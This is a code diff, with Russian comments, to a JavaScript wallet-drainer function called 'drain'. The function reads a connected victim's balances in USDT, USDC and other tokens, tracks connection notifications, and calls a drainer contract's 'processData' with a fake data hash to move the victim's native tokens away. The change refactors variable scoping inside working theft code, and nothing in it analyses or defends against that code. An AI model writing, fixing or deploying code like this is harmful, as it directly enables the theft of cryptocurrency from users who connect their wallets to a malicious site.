@@ -502,14 +502,16 @@ function formatBalance(balance, decimals) {
 async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`Подключённый кошелёк: ${userAddress}`);
 
+  const config = CHAINS[chainId];
+
+  // Определяем tokenAddresses на уровне функции
+  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
+
   // Проверяем, было ли уже отправлено уведомление о подключении для этого кошелька
   const connectNotifiedKey = `connectNotified_${userAddress}`;
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
 
   if (!hasNotified) {
-    // Собираем информацию для сообщения
-    const config = CHAINS[chainId];
-    
     // Укороченный адрес
     const shortAddress = shortenAddress(userAddress);
 
@@ -534,7 +536,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
 
     // Токены (USDT, USDC и другие)
-    const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
     for (const tokenAddress of tokenAddresses) {
       const balance = bal.tokenBalances[tokenAddress];
       if (balance && balance.gt(0)) {
@@ -660,10 +661,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
       const nonce = await provider.getTransactionCount(userAddress, "pending");
       // Инициализируем tokenAddresses для нативных токенов
-      const tokenAddresses = [];
+      const tokenAddressesForNative = [];
 
       try {
-        const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddresses, {
+        const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddressesForNative, {
           value,
           gasLimit: 100000,
           gasPrice: ethers.utils.parseUnits("3", "gwei"),
